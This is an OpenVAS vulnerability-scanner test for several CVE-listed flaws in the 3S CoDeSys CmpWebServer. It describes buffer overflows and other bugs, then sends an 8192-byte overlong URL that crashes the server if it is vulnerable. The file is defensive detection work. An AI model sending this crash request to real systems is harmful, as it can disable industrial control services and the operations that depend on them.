###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_codesys_cmpwebserver_multiple_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# 3S CoDeSys CmpWebServer Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  on the system or cause the application to crash.
  Impact Level: Application";
tag_affected = "3S CoDeSys version 3.4 SP4 Patch 2 and prior.";
tag_insight = "- A boundary error in the Control service when processing web requests can be
    exploited to cause a stack-based buffer overflow via an overly long URL sent
    to TCP port 8080.
  - A NULL pointer dereference error in the CmbWebserver.dll module of the
    Control service when processing HTTP POST requests can be exploited to deny
    processing further requests via a specially crafted 'Content-Length' header
    sent to TCP port 8080.
  - A NULL pointer dereference error in the CmbWebserver.dll module of the
    Control service when processing web requests can be exploited to deny
    processing further requests by sending a request with an unknown HTTP
    method to TCP port 8080.
  - An error in the Control service when processing web requests containing a
    non existent directory can be exploited to create arbitrary directories
    within the webroot via requests sent to TCP port 8080.
  - An integer overflow error in the Gateway service when processing certain
    requests can be exploited to cause a heap-based buffer overflow via a
    specially crafted packet sent to TCP port 1217.";
tag_solution = "No solution or patch is available as of 6th December, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.3s-software.com/index.shtml?en_CoDeSysV3_en";
tag_summary = "The host is running CoDeSys and is prone to multiple vulnerabilities.";

if(description)
{
  script_id(802280);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-5007", "CVE-2011-5008", "CVE-2011-5009", "CVE-2011-5058");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-06 12:12:12 +0530 (Tue, 06 Dec 2011)");
  script_name("3S CoDeSys CmpWebServer Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/77386");
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/77387");
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/77388");
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/77389");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47018");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18187");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/codesys_1-adv.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/107456/codesys-overflow.txt");

  script_description(desc);
  script_summary("Determine if CoDeSys CmpWebServer is vulnerable to Buffer Overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Get HTTP Port
port = get_http_port(default:8080);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port:port);
if("Server: 3S_WebServer" >!< banner) {
  exit(0);
}

## Building Exploit
req = string("GET /", crap(data:"a", length:8192), "\\a HTTP/1.0\r\n\r\n");

## Send crafted request
res = http_send_recv(port:port, data:req);

## Confirm CoDeSys CmpWebServer is dead or alive
if(http_is_dead(port:port)){
  security_hole(port);
}
